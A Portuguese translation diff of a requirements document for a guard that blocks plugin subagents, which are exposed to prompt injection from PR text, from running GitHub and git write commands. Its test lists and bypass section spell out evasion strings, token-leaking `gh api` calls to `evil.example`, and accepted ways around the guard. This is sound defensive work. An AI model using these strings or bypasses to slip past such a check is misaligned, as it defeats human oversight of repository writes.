@@ -1,256 +1,258 @@
-# PRD-027 · GitHub write guard, opencode recipe, and delegate self-match
+# PRD-027 · Trava de escrita do GitHub, receita do opencode e auto-casamento dos delegados
 
-| Field | Value |
+> Traduzido em 2026-11-17; o original em inglês está no commit `aa1e80a`.
+
+| Campo | Valor |
 |---|---|
-| Status | delivered on 2026-10-22 |
-| Owner | Daniel Malka |
-| Created / updated | 2026-10-21 / 2026-10-22 (amended 2026-10-21 after security review round 1; amended again 2026-10-21 after security review round 2; amended a third time 2026-10-21 after security review round 3; amended a fourth time 2026-10-21: the parser is replaced by a short rule (owner decision); amended a fifth time 2026-10-21 after security review round 4; amended a sixth time 2026-10-22 after security review round 5, owner choice "a": one last short round; amended a seventh time 2026-10-22 after security review round 6, owner choice "a": one extra round; amended an eighth time 2026-10-22 after security review round 7, owner choice "a": the backslash-newline form is an accepted bypass) |
-| Tickets | T-2701, T-2702, T-2703, T-2704 (planned) |
-| Origin | Security review of PRD-026 (residual S3), owner chat 2026-10-21 (discovery DISC-007); measurement M2 of the opencode recipe, 2026-10-21 |
-| Depends on | PRD-026 (delivered, 0.32.0) |
-| Enables | nothing |
+| Status | entregue em 2026-10-22 |
+| Responsável | Daniel Malka |
+| Criado / atualizado | 2026-10-21 / 2026-10-22 (emendado em 2026-10-21 após a rodada 1 da revisão de segurança; emendado de novo em 2026-10-21 após a rodada 2 da revisão de segurança; emendado uma terceira vez em 2026-10-21 após a rodada 3 da revisão de segurança; emendado uma quarta vez em 2026-10-21: o analisador é substituído por uma regra curta (decisão do dono); emendado uma quinta vez em 2026-10-21 após a rodada 4 da revisão de segurança; emendado uma sexta vez em 2026-10-22 após a rodada 5 da revisão de segurança, escolha "a" do dono: uma última rodada curta; emendado uma sétima vez em 2026-10-22 após a rodada 6 da revisão de segurança, escolha "a" do dono: uma rodada extra; emendado uma oitava vez em 2026-10-22 após a rodada 7 da revisão de segurança, escolha "a" do dono: a forma barra invertida seguida de nova linha é um contorno aceito) |
+| Tickets | T-2701, T-2702, T-2703, T-2704 (planejados) |
+| Origem | Revisão de segurança do PRD-026 (S3 residual), conversa com o dono em 2026-10-21 (descoberta DISC-007); medição M2 da receita do opencode, 2026-10-21 |
+| Depende de | PRD-026 (entregue, 0.32.0) |
+| Habilita | nada |
 
-## 1. Problem
+## 1. Problema
 
-Three defects ride in one batch (0.32.1).
+Três defeitos viajam em um só lote (0.32.1).
 
-**G1 · Prose is the only barrier against a `gh` write (S3 residual of PRD-026).** In `/dh:review pr <n>`, a dispatched `qa-verifier` reads third-party PR text (title, body, comments) and has the Bash tool and the `gh` credential. The rule "no `gh` write verb" exists only as prose in `.commands/review.md`. Fact: the session runs in bypass permission mode, so no permission prompt stands between an injected `gh pr merge` and the repository. Fact: `adapters/claude-code/plugin/hooks/panel.ts` already runs a Bash guard (`guardBash`, `tool.call` path) for commits and AI mentions, but no check on `gh` write verbs or `git push`.
+**G1 · A prosa é a única barreira contra uma escrita do `gh` (S3 residual do PRD-026).** Em `/dh:review pr <n>`, um `qa-verifier` despachado lê o texto de terceiros de um PR (título, corpo, comentários) e tem a ferramenta Bash e a credencial do `gh`. A regra "nenhum verbo de escrita do `gh`" existe só como prosa em `.commands/review.md`. Fato: a sessão roda no modo de permissão `bypass`, então nenhum prompt de permissão se interpõe entre um `gh pr merge` injetado e o repositório. Fato: `adapters/claude-code/plugin/hooks/panel.ts` já roda uma trava de Bash (`guardBash`, caminho `tool.call`) para commits e menções a IA, mas não há checagem de verbos de escrita do `gh` nem de `git push`.
 
-**G2 · The opencode recipe fails on v2.0.32.** Fact (measured 2026-10-21, M2): `opencode run` has no `--dir` and no `--variant`. The variant is part of the model string (`-m provider/model#variant`). A separate `cd` in its own Bash call does not persist, because the runtime resets the working directory. Fact: `.skills/external-clis/references/opencode.md`, `references/clone-isolation.md`, `references/live-tree-freeze.md` and `SKILL.md` still show `--dir` and `--variant`.
+**G2 · A receita do opencode falha na v2.0.32.** Fato (medido em 2026-10-21, M2): `opencode run` não tem `--dir` nem `--variant`. A variante faz parte da string do modelo (`-m provider/model#variant`). Um `cd` separado, em sua própria chamada de Bash, não persiste, porque o runtime redefine o diretório de trabalho. Fato: `.skills/external-clis/references/opencode.md`, `references/clone-isolation.md`, `references/live-tree-freeze.md` e `SKILL.md` ainda mostram `--dir` e `--variant`.
 
-**G3 · Delegates kill their own shell.** Fact (seen 2026-10-21): `pgrep -f` and `pkill -f` with a pattern that contains the delegate's own command or path match the delegate's shell. Result: exit 144 and endless waits. Fact: `live-tree-freeze.md`, `clone-isolation.md` and `agy.md` recommend `pkill -f -- "<clone path>"` or `pkill -f -- "<prompt basename>"`.
+**G3 · Os delegados matam o próprio shell.** Fato (visto em 2026-10-21): `pgrep -f` e `pkill -f` com um padrão que contém o comando ou o caminho do próprio delegado casam com o shell do delegado. Resultado: saída 144 e esperas infinitas. Fato: `live-tree-freeze.md`, `clone-isolation.md` e `agy.md` recomendam `pkill -f -- "<clone path>"` ou `pkill -f -- "<prompt basename>"`.
 
-Also: `.agents/release-manager.md` ("Stop when") says "This role performs no remote action". That sentence is not true for the flow where the owner authorizes a publish, and it hides the rule that decides who may publish.
+Além disso: `.agents/release-manager.md` (`Stop when`) diz `This role performs no remote action`. Essa frase não é verdadeira para o fluxo em que o dono autoriza uma publicação, e esconde a regra que decide quem pode publicar.
 
-## 2. Solution
+## 2. Solução
 
-### 2.1 The guard
+### 2.1 A trava
 
-In Claude Code, the plugin mod denies a shell-command call when all of these hold:
+No Claude Code, o mod do plugin nega uma chamada de comando de shell quando todas estas condições valem:
 
-1. The call has an `agentId`, so a subagent makes it.
-2. The subagent type is a kit type (prefix `dh:`) and it is not `dh:release-manager`, or the type is not in the map (fail closed).
-3. The rule of 2.3 denies the command.
+1. A chamada tem um `agentId`, ou seja, um subagente a faz.
+2. O tipo do subagente é um tipo do kit (prefixo `dh:`) e não é `dh:release-manager`, ou o tipo não está no mapa (falha fechada).
+3. A regra de 2.3 nega o comando.
 
-The check runs on the Bash tool and on every other tool that takes a shell command (`Monitor`, `PowerShell`). For each tool, the mod reads the `command` field of the call (R3). Fact: the `PowerShell` input carries the command text in `command`, a string, the same as `Bash` (Claude Code docs, hooks page). A `PowerShell` call from a kit subagent in scope is denied with the verb "unreadable command" when `command` is missing or is not a string. A `Monitor` call without `command` (a monitor that is not a shell command) is not denied.
+A checagem roda na ferramenta Bash e em toda outra ferramenta que recebe um comando de shell (`Monitor`, `PowerShell`). Para cada ferramenta, o mod lê o campo `command` da chamada (R3). Fato: a entrada do `PowerShell` traz o texto do comando em `command`, uma string, igual ao `Bash` (docs do Claude Code, página de hooks). Uma chamada de `PowerShell` de um subagente do kit no escopo é negada com o verbo `unreadable command` quando `command` falta ou não é uma string. Uma chamada de `Monitor` sem `command` (um monitor que não é um comando de shell) não é negada.
 
-The main session (no `agentId`) and `dh:release-manager` are not affected. A subagent that is not a kit agent is not affected (other plugins' agents in the same session must keep working). The mod builds the map `agentId` to `subagentType` from `agent.spawn`, where `panel.ts` already reads `x.subagentType` and `r.agentId`.
+A sessão principal (sem `agentId`) e o `dh:release-manager` não são afetados. Um subagente que não é do kit não é afetado (os agentes de outros plugins na mesma sessão precisam continuar funcionando). O mod monta o mapa `agentId` para `subagentType` a partir de `agent.spawn`, onde o `panel.ts` já lê `x.subagentType` e `r.agentId`.
 
-A shell-command call with an `agentId` that the map does not know is denied, with a reason that names the cause ("unknown subagent type"). This is the fail-closed branch. Only a denial by 2.3 triggers this guard: a call that 2.3 allows is never denied by this guard.
+Uma chamada de comando de shell com um `agentId` que o mapa não conhece é negada, com um motivo que nomeia a causa (`unknown subagent type`). Este é o ramo de falha fechada. Só uma negação por 2.3 aciona esta trava: uma chamada que 2.3 permite nunca é negada por esta trava.
 
-### 2.2 The `gh` read list
+### 2.2 A lista de leituras do `gh`
 
-The guard allows only these `gh` reads. It denies every other `gh` command, so a new write verb is denied without a list change.
+A trava permite só estas leituras do `gh`. Ela nega todo outro comando `gh`, então um verbo de escrita novo é negado sem mudar a lista.
 
-| Command | Allowed |
+| Comando | Permitido |
 |---|---|
-| `gh` with no subcommand, `gh --version`, `gh status` | yes |
+| `gh` sem subcomando, `gh --version`, `gh status` | sim |
 | `gh pr` | `view`, `diff`, `list`, `status`, `checks` |
 | `gh issue` | `view`, `list`, `status` |
 | `gh repo` | `view`, `list` |
 | `gh run` | `view`, `list`, `watch` |
 | `gh release` | `view`, `list` |
 | `gh workflow` | `view`, `list` |
-| `gh search <kind>` | yes |
-| `gh auth status` | yes, with only `-h` or `--hostname` (with a value, or `=value`) and `-a` or `--active`. Any other token that starts with `-` makes it not a read |
-| `gh api <path>` | yes, when every flag is `--jq` or `-q` (with a value), `--paginate`, `-i` or `--include`, `--cache` (with a value), or `--silent`. It has no `--hostname` |
+| `gh search <kind>` | sim |
+| `gh auth status` | sim, só com `-h` ou `--hostname` (com um valor, ou `=value`) e `-a` ou `--active`. Qualquer outro token que comece com `-` faz com que não seja uma leitura |
+| `gh api <path>` | sim, quando toda flag é `--jq` ou `-q` (com um valor), `--paginate`, `-i` ou `--include`, `--cache` (com um valor), ou `--silent`. Não tem `--hostname` |
 
-The guard checks a `gh` read from left to right, in order:
+A trava checa uma leitura do `gh` da esquerda para a direita, em ordem:
 
-- A flag that takes a value consumes the next token (or its `=value`), whatever that token looks like.
-- `-R` or `--repo <value>` is accepted only in an option position, before or after the subcommand. It is never the value of another flag.
-- A value flag with no value makes the command not a read.
-- For the subcommands other than `gh api` and `gh auth status`, other flags are allowed (`gh pr view 1 --json title`).
-- `gh api` accepts only the flags of the table. It does not accept `-R`, `--repo` or `--hostname` (`--hostname <v>` or `--hostname=<v>`).
-- A `gh api` command with any token that contains `://` is not a read. A full URL or another host can send the stored token away.
+- Uma flag que recebe um valor consome o próximo token (ou seu `=value`), seja qual for a aparência desse token.
+- `-R` ou `--repo <value>` só é aceito em posição de opção, antes ou depois do subcomando. Nunca é o valor de outra flag.
+- Uma flag de valor sem valor faz com que o comando não seja uma leitura.
+- Para os subcomandos além de `gh api` e `gh auth status`, as outras flags são permitidas (`gh pr view 1 --json title`).
+- `gh api` aceita só as flags da tabela. Não aceita `-R`, `--repo` nem `--hostname` (`--hostname <v>` ou `--hostname=<v>`).
+- Um comando `gh api` com qualquer token que contenha `://` não é uma leitura. Uma URL completa ou outro host pode enviar o token guardado para fora.
 
-Example: `gh api repos/o/r --jq -R --method=DELETE` is denied. `--jq` consumes `-R` as its value, and `--method=DELETE` is not in the list.
+Exemplo: `gh api repos/o/r --jq -R --method=DELETE` é negado. `--jq` consome `-R` como seu valor, e `--method=DELETE` não está na lista.
 
-A `--help` or `-h` on a write subcommand is not a read. `gh pr merge --help` is denied.
+Um `--help` ou `-h` em um subcomando de escrita não é uma leitura. `gh pr merge --help` é negado.
 
-For `git` there is no read list. The guard always denies a triggered `git` command, except the plain grep of 2.3.
+Para o `git` não há lista de leituras. A trava sempre nega um comando `git` disparado, exceto o grep simples de 2.3.
 
-### 2.3 The rule
+### 2.3 A regra
 
-The guard applies one short rule. It has no parser: no splitting, no recursion and no length limit. The rule is the same for Bash, Monitor and PowerShell.
+A trava aplica uma regra curta. Não há analisador: sem divisão, sem recursão e sem limite de tamanho. A regra é a mesma para Bash, Monitor e PowerShell.
 
-1. The trigger text is the command in lower case, with these changes.
-   - Bash: the guard builds two trigger texts. Text A: every `\`, `'` and `"` is removed. Text B: each pair `\\` becomes `/`, then every remaining `\`, `'` and `"` is removed. The command is triggered when either text triggers (point 2).
-   - Why text A: inside a legacy backtick command substitution, bash removes one backslash layer first. So ``echo `g\\it push` `` runs `git push`, and text A has the word `git`.
-   - Why text B: a Windows-style path with doubled backslashes must not fuse into the name. In text B the pairs become `/`, so the word `gh` stays a word.
-   - PowerShell: every `\` becomes `/`. Every `'`, `"` and backtick is removed.
-   - In PowerShell, `\` is a path separator, not an escape. So `<drive>:\Program Files\GitHub CLI\gh.exe` keeps the word `gh`.
-   - In PowerShell, the backtick is an ignored escape inside a name (`g`h`), so it is removed.
-2. The command is triggered when the trigger text has a word `gh`, or a word `git` and also, anywhere in the trigger text, one of the write words `push`, `send-pack`, `subtree`, `p4`, `svn`, `dcommit`, `alias`.
-3. A word starts at the beginning or after any character that is not a letter, a digit or `_`. So `=`, `.`, `-` and `:` start a word.
-   - The word `git` ends at the end, before `.exe`, or before any character that is not a letter, a digit or `_`. So it ends before `-`, and `git-lfs push` and `git-push` trigger.
-   - The word `gh` ends at the end, before `.exe`, or before any character that is not a letter, a digit, `_` or `-`. It does not end before `-`.
-   - A write word ends at the end or before any character that is not a letter, a digit, `_` or `-`.
-   - So `gh-pages` and `ghq` are not the word `gh`. `/usr/bin/gh`, `gh.exe`, `gh)`, `--upload-pack=gh` and `GIT_CONFIG_KEY_0=alias.p` are.
-4. A command that is not triggered is not denied by this guard.
-5. A triggered command is allowed in two cases only. Otherwise it is denied.
-   - The gh read. No trigger text triggered on `git` (in Bash, neither text A nor text B). The raw command, trimmed, has only the characters `A-Z a-z 0-9`, space, `.`, `_`, `/`, `:`, `=`, `,`, `@`, `%`, `+` and `-`. It is one `gh` read from 2.2.
-   - The plain grep. The first word is `grep`, `egrep` or `fgrep`. The raw command has none of `;`, `|`, `&`, `$`, `(`, `)`, `<`, `>`, the backtick or a newline. Quotes and backslashes are allowed. grep cannot run another program, so its pattern can name `git push`.
+1. O texto de disparo é o comando em minúsculas, com estas mudanças.
+   - Bash: a trava monta dois textos de disparo. Texto A: todo `\`, `'` e `"` é removido. Texto B: cada par `\\` vira `/`, depois todo `\`, `'` e `"` restante é removido. O comando é disparado quando qualquer um dos textos dispara (ponto 2).
+   - Por que o texto A: dentro de uma substituição de comando legada com acento grave, o bash remove primeiro uma camada de barra invertida. Então ``echo `g\\it push` `` roda `git push`, e o texto A tem a palavra `git`.
+   - Por que o texto B: um caminho no estilo Windows com barras invertidas dobradas não pode se fundir ao nome. No texto B os pares viram `/`, então a palavra `gh` continua sendo uma palavra.
+   - PowerShell: todo `\` vira `/`. Todo `'`, `"` e acento grave é removido.
+   - No PowerShell, `\` é um separador de caminho, não um escape. Então `<drive>:\Program Files\GitHub CLI\gh.exe` mantém a palavra `gh`.
+   - No PowerShell, o acento grave é um escape ignorado dentro de um nome (`g`h`), então é removido.
+2. O comando é disparado quando o texto de disparo tem uma palavra `gh`, ou uma palavra `git` e também, em qualquer lugar do texto de disparo, uma das palavras de escrita `push`, `send-pack`, `subtree`, `p4`, `svn`, `dcommit`, `alias`.
+3. Uma palavra começa no início ou depois de qualquer caractere que não seja letra, dígito ou `_`. Então `=`, `.`, `-` e `:` iniciam uma palavra.
+   - A palavra `git` termina no fim, antes de `.exe`, ou antes de qualquer caractere que não seja letra, dígito ou `_`. Então termina antes de `-`, e `git-lfs push` e `git-push` disparam.
+   - A palavra `gh` termina no fim, antes de `.exe`, ou antes de qualquer caractere que não seja letra, dígito, `_` ou `-`. Não termina antes de `-`.
+   - Uma palavra de escrita termina no fim ou antes de qualquer caractere que não seja letra, dígito, `_` ou `-`.
+   - Então `gh-pages` e `ghq` não são a palavra `gh`. `/usr/bin/gh`, `gh.exe`, `gh)`, `--upload-pack=gh` e `GIT_CONFIG_KEY_0=alias.p` são.
+4. Um comando que não é disparado não é negado por esta trava.
+5. Um comando disparado é permitido em dois casos apenas. Fora deles, é negado.
+   - A leitura do gh. Nenhum texto de disparo disparou em `git` (no Bash, nem o texto A nem o texto B). O comando bruto, aparado, tem só os caracteres `A-Z a-z 0-9`, espaço, `.`, `_`, `/`, `:`, `=`, `,`, `@`, `%`, `+` e `-`. É uma leitura do `gh` de 2.2.
+   - O grep simples. A primeira palavra é `grep`, `egrep` ou `fgrep`. O comando bruto não tem nenhum de `;`, `|`, `&`, `$`, `(`, `)`, `<`, `>`, o acento grave nem uma nova linha. Aspas e barras invertidas são permitidas. O grep não consegue rodar outro programa, então seu padrão pode citar `git push`.
 
-PowerShell: neither allowed case applies. A triggered PowerShell command is always denied, so `gh pr view 1` in PowerShell is denied.
+PowerShell: nenhum dos dois casos permitidos se aplica. Um comando de PowerShell disparado é sempre negado, então `gh pr view 1` no PowerShell é negado.
 
-Every triggered command outside the two allowed cases is denied, even when it is harmless. Accepted false positives:
+Todo comando disparado fora dos dois casos permitidos é negado, mesmo quando é inofensivo. Falsos positivos aceitos:
 
-- A compound command that names `gh` (`cd x && gh pr view 1`). Run the read alone.
-- A gh read with quotes or other special characters (`gh pr view 1 --jq '.x'`).
-- A git command that names a write word (`git log --grep=push`, or a commit message that names push). Only `release-manager` commits.
-- A search that is not grep and names `gh` or a git write word (`rg 'git push'`).
-- A path with a `gh` part (`ls ~/.config/gh`).
-- A harmless text with the word `gh` (`echo gh`, `grep -n 'gh;' README.md`, `npm run x-gh`).
-- A git read that names a write word in an option (`git log --grep=push`).
-- Any `gh` read in PowerShell.
-- A `gh` read whose binary name is not lower case (`GH pr view 1`). The read check uses the raw command, so it is denied. This fails closed.
+- Um comando composto que cita `gh` (`cd x && gh pr view 1`). Rode a leitura sozinha.
+- Uma leitura do gh com aspas ou outros caracteres especiais (`gh pr view 1 --jq '.x'`).
+- Um comando git que cita uma palavra de escrita (`git log --grep=push`, ou uma mensagem de commit que cita push). Só o `release-manager` faz commits.
+- Uma busca que não é grep e cita `gh` ou uma palavra de escrita do git (`rg 'git push'`).
+- Um caminho com uma parte `gh` (`ls ~/.config/gh`).
+- Um texto inofensivo com a palavra `gh` (`echo gh`, `grep -n 'gh;' README.md`, `npm run x-gh`).
+- Uma leitura do git que cita uma palavra de escrita em uma opção (`git log --grep=push`).
+- Qualquer leitura do `gh` no PowerShell.
+- Uma leitura do `gh` cujo nome de binário não está em minúsculas (`GH pr view 1`). A checagem de leitura usa o comando bruto, então é negada. Isso é falha fechada.
 
-The deny message tells the agent to use the Grep tool for a text search. The owner can run the command in the main session.
+A mensagem de negação diz ao agente para usar a ferramenta Grep em uma busca de texto. O dono pode rodar o comando na sessão principal.
 
-### 2.4 Known bypasses (accepted, not fixed)
+### 2.4 Contornos conhecidos (aceitos, não corrigidos)
 
-The guard is text analysis. An unexpected exception inside it lets the call through (R7). It does not stop:
+A trava é análise de texto. Uma exceção inesperada dentro dela deixa a chamada passar (R7). Ela não impede:
 
-- a command name built at run time (variables, `eval`, string tricks that leave no `gh` or `git` word, such as a backslash followed by a newline inside the name);
-- shell aliases and functions defined earlier;
-- scripts and build tools on disk (`make push`);
-- other interpreters (`python -c`, `node -e`) and text piped into one;
-- git aliases stored in config by an earlier call;
-- `curl` with a token;
-- MCP GitHub tools;
-- a non-kit subagent;
-- child processes of an external CLI;
-- unverified hypothesis (not checked against `gh`): in the read groups other than `gh api`, a `-R HOST/OWNER/REPO` value, a `HOST/OWNER/REPO` argument or a full URL argument could make `gh` send `GH_ENTERPRISE_TOKEN` to another host. The owner's setup has no such token. Revisit if a GitHub Enterprise token is used.
+- um nome de comando montado em tempo de execução (variáveis, `eval`, truques de string que não deixam palavra `gh` nem `git`, como uma barra invertida seguida de nova linha dentro do nome);
+- aliases e funções de shell definidos antes;
+- scripts e ferramentas de build em disco (`make push`);
+- outros interpretadores (`python -c`, `node -e`) e texto enviado por pipe a um deles;
+- aliases do git guardados na configuração por uma chamada anterior;
+- `curl` com um token;
+- ferramentas MCP do GitHub;
+- um subagente que não é do kit;
+- processos filhos de uma CLI externa;
+- hipótese não verificada (não checada contra o `gh`): nos grupos de leitura além de `gh api`, um valor `-R HOST/OWNER/REPO`, um argumento `HOST/OWNER/REPO` ou um argumento de URL completa poderia fazer o `gh` enviar o `GH_ENTERPRISE_TOKEN` a outro host. A configuração do dono não tem esse token. Revisite se um token de GitHub Enterprise for usado.
 
-The prose bans stay as the second layer. An OS sandbox is out of scope.
+As proibições em prosa continuam como segunda camada. Um sandbox de SO está fora do escopo.
 
-### 2.5 Other changes
+### 2.5 Outras mudanças
 
-- `release-manager` text is corrected (D8). It runs the remote actions (push, PR, merge, tag) only with explicit owner authorization, and it never receives third-party PR title, body or comments. Any dispatch rule that sends PR text to an agent names `qa-verifier`, never `release-manager`.
-- The opencode recipe is corrected (D10). opencode becomes the second named exception, beside `claude`, to the rule "the call is one command that starts with the binary".
-- The self-match gotcha is recorded and the three kill recipes change (D11).
-- Release 0.32.1, one PR. The PR touches the critical paths of `REVIEW.md` (`adapters/claude-code/plugin/hooks/**`, `.skills/external-clis/**`), so it stops before the merge for the owner's ok.
+- O texto do `release-manager` é corrigido (D8). Ele roda as ações remotas (push, PR, merge, tag) só com autorização explícita do dono, e nunca recebe o título, o corpo nem os comentários de um PR de terceiros. Toda regra de despacho que envia texto de PR a um agente nomeia o `qa-verifier`, nunca o `release-manager`.
+- A receita do opencode é corrigida (D10). O opencode vira a segunda exceção nomeada, ao lado do `claude`, à regra "a chamada é um comando que começa com o binário".
+- A pegadinha do auto-casamento é registrada e as três receitas de kill mudam (D11).
+- Release 0.32.1, um PR. O PR toca os caminhos críticos do `REVIEW.md` (`adapters/claude-code/plugin/hooks/**`, `.skills/external-clis/**`), então para antes do merge, à espera do ok do dono.
 
-## 3. Rules
+## 3. Regras
 
-Each rule states how to verify it. File names for new code are the author's proposal.
+Cada regra diz como verificá-la. Os nomes de arquivo do código novo são proposta do autor.
 
-- R1 Pure function. A new file in `adapters/claude-code/plugin/hooks/lib/` (proposal: `gh-guard.ts`) exports a pure function. Its input is a command string. Its output is the denied command (a string such as `gh pr merge`, `gh secret set` or `git push`) or `undefined`. It reads no file and runs no process. Verifiable: the file exists, imports nothing that does I/O, and the unit tests of R2 call it directly.
-- R2 Unit tests. A test file covers the cases below. Verifiable: the tests pass under the repository's TypeScript test run (the command `claude plugin test` or the hooks test script that `panel.test.ts` already uses).
-  - Denied (a command is returned): `gh pr merge 1 --squash`; `gh pr merge --help`; `cd x && git push`; `GH_TOKEN=t gh pr comment 1 -b hi`; `gh api -X POST repos/o/r/issues/1/comments`; `gh api repos/o/r/issues/1/comments -f body=hi`; `gh api repos/o/r/pulls/1 -iXPUT`; `gh api repos/o/r/pulls/1 --method PUT`; `gh api -iXPOST repos/o/r/issues/1/comments`; `gh api -pfbody=hi repos/o/r/issues/1/comments`; `gh api -H "X-HTTP-Method-Override: PUT" repos/o/r/pulls/1/merge`.
-  - Denied, regression set from the review rounds: `git status; gh pr merge 1`; `echo "$(true; gh pr merge 1)"`; `echo "$(git -c 'user.name=a;b' push)"`; `git -c 'user.name=a;b' push`; `echo $'it\'s'; gh pr merge 1`; `g\it push`; `\git push`; `git` and `push` split by a line continuation; `sudo -u x gh pr merge 1`; `env -u VAR gh pr merge 1`; `env -u git gh pr merge 1`; `env -u git git push`; one case for each of the wrappers `timeout`, `nohup`, `nice`, `time`, `xargs`, `stdbuf` and `setsid`; one case for each of `{`, `!`, `then`, `do` and `else` before the binary; `>/dev/null gh pr merge 1`; `<(gh pr merge 1)` and `>(gh pr merge 1)`; `gh.exe pr merge 1`; `git.exe push`; `bash -c "git push"`; `git push>out.txt`; `gh pr merge>out.txt`; `find . -exec git push \;`; `find . -execdir gh pr merge 1 {} +`; `watch -n 1 git push`; `script -qc "git push" /dev/null`; `parallel git push ::: a`; `flock /tmp/l git push`; `chronic git push`; `ssh host git push`; `git send-pack`; `git subtree push --prefix d origin main`; `git p4 submit`; `git svn dcommit`; `git -c alias.p=push p`; `git config --global alias.p push && git p`; `gh alias set x y`; `gh auth status -t`; `gh auth status --show-token`; `gh api repos/o/r --jq -R --method=DELETE`; `gh api repos/o/r --repo --method=DELETE`; `gh api repos/o/r --jq`; `gh auth status --show-token=true`; `gh auth status -t=true`; `gh auth status -at`; `git -c core.sshCommand='gh pr merge 1 #' fetch`; `git --upload-pack='gh pr merge 1 #' fetch x`; `GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.p GIT_CONFIG_VALUE_0=push git p`; `$(git --exec-path)/git-push`; `echo gh`; `grep -n 'gh;' README.md`; `git log --grep=push`; `npm run x-gh`; a PowerShell call with `g`, a backtick, then `h pr merge 1`; a PowerShell call `gh pr view 1` (no exception in PowerShell); `rg --pre 'git push' x .`; `ag --pager 'gh pr merge 1' x`; `echo 'a && git push'`.
-  - Denied, one case for each other `gh` family: `gh issue close`, `gh release create`, `gh repo delete`, `gh auth token`, `gh workflow run`, `gh api --method DELETE`, `gh api --input x`, `gh secret set`, `gh secret delete`, `gh variable set`, `gh label create`, `gh run rerun`, `gh run cancel`, `gh run delete`, `gh workflow enable`, `gh workflow disable`, `gh gist create`, `gh pr update-branch`, `gh pr lock`, `gh cache delete`, `gh repo deploy-key add`, `gh release delete-asset`.
-  - Denied, new with the short rule: `ls ~/.config/gh`; `cat ~/.config/gh/hosts.yml`; `$(echo gh) pr merge 1`; `gh pr view 1 --jq '.x'` (an accepted false positive).
-  - Denied, new with amendment 6: the PowerShell call `<drive>:\Program Files\GitHub CLI\gh.exe pr merge 1`; `GH pr merge 1`; `Git push`; `git-lfs push origin main`; `gh api --hostname evil.example repos/o/r`; `gh api https://evil.example/x`; `GH pr view 1` (an accepted false positive).
-  - Allowed (`undefined`): `gh pr view 1 --json title`; `gh pr diff 1`; `gh api repos/o/r/pulls/1`; `gh api repos/o/r/pulls/1 --jq .title`; `gh pr view 1 -R o/r`; `gh -R o/r pr view 1`; `gh auth status -h github.com`; `gh auth status --active`; `ghq list`; `grep -rn "git push" docs/`; `grep -rn "gh pr view" .commands`; `git log --oneline`; `git status && git diff`; `git -c 'user.name=a;b' status`; `env -u git git status`; `gh pr checks 1 --watch`; `gh run watch 123`; `git fetch origin`; `gh pr view 45 --json state,mergedAt`; `gh run list --limit 3`; `go test ./... 2>&1 | tail -n 20`; `sha256sum $(git ls-files -m)`; `git log --format='%h (%s)' -n 3`; `npm run gh-pages`; `gh auth status`; `gh --version`; `echo "$(git -c 'user.name=a;b' status)"`; `gh api -i repos/o/r/pulls/1`; one case for each other read of 2.2.
-  - Denied, new with amendment 7: ``echo `g\\it push` ``; ``echo `g\\h pr merge 1` ``; `g\\it push`.
-  - Allowed, regression cases of amendment 6: `gh pr view 1`; `gh api repos/o/r --jq .name`; `gh auth status -h github.com`; `git log`; `ls gh-pages`.
-- R3 Wiring. The guard runs inside the existing `tool.call` path of `panel.ts`, by `guardBash` (or a function it calls). The same check runs on the `Bash` tool and on every other tool that takes a shell command (`Monitor`, `PowerShell`), on its command field, through that mod path. No new `hooks.json` entry, no `command` hook, no new module. Verifiable: `git diff main...HEAD -- adapters/claude-code/plugin/hooks/hooks.json` is empty; `panel.ts` calls the R1 function for each of these tools.
-- R4 Subagent map. `panel.ts` records `agentId` to `subagentType` when `agent.spawn` returns an `agentId`, in the same place that calls `recordSpawn`. The guard reads the map by the `agentId` of the Bash call. Verifiable: an engine test spawns a subagent of type `dh:qa-verifier` and then sends a Bash call with that `agentId`.
-- R5 Scope of the deny. In an engine test (the setup in `panel.engine.test.ts`): (a) a Bash call with `agentId` of type `dh:qa-verifier` and a denied command returns `deny`; (b) the same command with `agentId` of type `dh:release-manager` is not denied by the guard; (c) the same command with no `agentId` (main session) is not denied by the guard; (d) the same command with `agentId` of a type with another prefix (for example `vault-agent`) is not denied by the guard; (e) a Bash call with an `agentId` that the map does not know and a denied command returns `deny` with a reason that names the cause; (f) a kit subagent with an allowed command (`gh pr view 1`) is not denied; (g) a `Monitor` call with `agentId` of type `dh:qa-verifier` and a denied command returns `deny`, and the same `Monitor` call with no `agentId` is not denied by the guard; (h) a `PowerShell` call with `agentId` of type `dh:qa-verifier` and no string `command` returns `deny` with the verb "unreadable command", and a `Monitor` call without `command` is not denied. Verifiable: the eight tests pass. "Not denied by the guard" means the result is the same as before this PRD for that call.
-- R6 Deny message. The reason (a) names the matched verb, (b) says that only `release-manager` or the main session may run it, (c) says not to retry and not to work around it, and (d) says: "For a text search, use the Grep tool." The reason for an unknown `agentId` (R5 e) also names that cause. The message is in English and uses the project's language table if `panel.ts` already holds one for other guard messages; if it does, both languages carry the four parts. Verifiable: a test asserts the four parts in the reason; no private path appears in it.
-- R7 Fail-open on guard error, fail-closed on unknown type. An exception inside the guard function does not deny the call (the existing `.catch(() => undefined)` in the Bash path stays). An unknown `agentId` with a command that 2.3 denies is denied (R5 e). Verifiable: one test throws inside the guard and the call passes; R5 e passes.
-- R8 Measurement M1 (owner-authorized, run by `qa-verifier` in QA after the build). One real session `claude -p --plugin-dir <built plugin dir>` in bypass permission mode. Inside it, a `dh:qa-verifier` subagent runs `gh pr merge --help`, and a `dh:release-manager` subagent runs `gh pr merge --help`. Pass: the first call is denied by the mod with the R6 message; the second prints the help text. The evidence is the session output, saved under `.harness/tasks/<id>/evidence/`. This proves that a subagent's Bash call reaches the mod with its `agentId` and that the deny holds in bypass mode. If M1 fails, this PRD ships the guard only after the owner decides; the other rules (R9 to R14) are not blocked by M1. Verifiable: the evidence file holds both outputs; the QA matrix lists M1 as pass, fail or not-run.
-- R9 ADR amendment. `docs/adr/ADR-005-trava-de-runtime-por-mod.md` has an amendment dated 2026-10-21. It states: (a) a narrow exception to the sentence "travar `Bash` por análise de comando" in section 2, limited to the commands that the rule of 2.3 denies (`gh` outside the read list of 2.2, and `git` with a write word), in the Bash, Monitor and PowerShell calls of kit subagents; (b) the accepted bypasses of 2.4; (c) the PRD number. The header field "Alterado por" lists PRD-027. ADR text stays in pt-br like the rest of that file. Verifiable: `grep -n 'PRD-027' docs/adr/ADR-005-trava-de-runtime-por-mod.md` finds the header and the amendment; the amendment names all bypasses of 2.4.
